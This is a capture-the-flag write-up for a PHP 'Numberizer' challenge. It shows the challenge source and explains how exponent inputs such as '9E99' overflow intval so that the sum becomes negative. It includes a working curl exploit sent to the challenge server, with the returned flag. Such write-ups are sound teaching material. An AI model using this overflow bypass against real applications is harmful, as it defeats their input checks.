Simple PHP challenge

```php
<?php
for($i = 0; $i < $MAX_NUMS; $i++) {
    if(!isset($_POST['numbers'][$i]) || strlen($_POST['numbers'][$i])>4 || !is_numeric($_POST['numbers'][$i])) {
        continue;
    }
    $the_number = intval($_POST['numbers'][$i]);
    if($the_number < 0) {
        continue;
    }
    $numbers[] = $the_number;
}
$sum = intval(array_sum($numbers));
if($sum < 0) {
    echo "You win a flag: $FLAG";
} else {
    echo "You win nothing with number $sum ! :-(";
}
?>
```

In php, `is_numeric` detects the `E` within the string and considers it as exponent, for example `2E2` is`2*10^2` result in `200`

In this challenge, our goal is to make the sum of the 5 input number lower than 0

The `intval()` function in PHP can behave unexpectedly when the input exceeds the platform's maximum integer size, the result may be a negative number. 

```php
// On a 32-bit system
echo intval(2147483648);  // Output: -2147483648
```

When a number got input as `9E99`, it return `9223372036854775807`, with all 5 input as `9E99`, PHP process the sum as an negative number, and return the flag.

```
┌─[nguyenlong05@sw1mj3llyf1sh]
└─[$] <> curl -X POST "http://52.59.124.14:5004/" \
-H "Content-Type: application/x-www-form-urlencoded" \
--data-urlencode "numbers[]=9E99" \
--data-urlencode "numbers[]=9E99" \
--data-urlencode "numbers[]=9E99" \
--data-urlencode "numbers[]=9E99" \
--data-urlencode "numbers[]=9E99"           
You win a flag: ENO{INTVAL_IS_NOT_ALW4S_P0S1TiV3!}
<html>
	<head>
		<title>Numberizer</title>
	</head>
	<body>
		<h1>Numberizer</h1>
		<form action="/" method="post">
			<label for="numbers">Give me at most 10 numbers to sum!</label><br>
			<input type="text" name="numbers[]"><br><input type="text" name="numbers[]"><br><input type="text" name="numbers[]"><br><input type="text" name="numbers[]"><br><input type="text" name="numbers[]"><br>			<button type="submit">Submit</button>
		</form>
		<p>To view the source code, <a href="/?source">click here.</a>
	</body>
</html>
```